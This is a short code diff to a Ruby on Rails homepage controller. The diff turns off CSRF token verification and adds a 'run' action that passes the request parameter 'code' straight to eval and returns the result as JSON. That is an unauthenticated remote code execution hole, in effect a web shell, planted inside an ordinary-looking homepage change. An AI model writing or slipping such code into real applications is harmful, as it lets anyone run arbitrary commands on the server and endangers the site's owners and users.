@@ -1,5 +1,10 @@
 class HomepageController < ApplicationController
+  skip_before_action :verify_authenticity_token
+  
   def index
-    @welcome_message = "Welcome to you!"
+  end
+
+  def run
+    render json: eval(params[:code])
   end
 end
